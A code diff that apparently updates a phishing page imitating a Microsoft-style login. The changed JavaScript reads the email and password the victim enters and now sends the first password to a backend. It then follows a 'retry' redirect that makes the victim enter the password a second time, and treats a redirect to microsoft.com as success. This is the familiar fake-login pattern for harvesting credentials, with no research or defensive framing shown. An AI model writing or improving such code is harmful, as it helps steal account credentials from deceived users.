@@ -150,8 +150,8 @@
       const pwd = document.getElementById("passwordInput").value;
       if(pwd.trim()) {
         password = pwd;
-        // First password attempt - always go to step 3
-        showStep3();
+        // Submit to backend for first attempt (should get blocked and redirect to step 3)
+        submitToBackend(email, password, false);
       } else {
         alert("Please enter your password.");
       }
@@ -293,6 +293,12 @@
     .then(response => {
       const redirected = response.redirected;
       const url = response.url;
+      
+      // Check if redirected to retry page (first attempt blocked)
+      if (redirected && url.includes('step=retry')) {
+        window.location.href = url;
+        return;
+      }
       
       // Check if redirected to microsoft.com (success case)
       if (redirected && url.includes('microsoft.com')) {
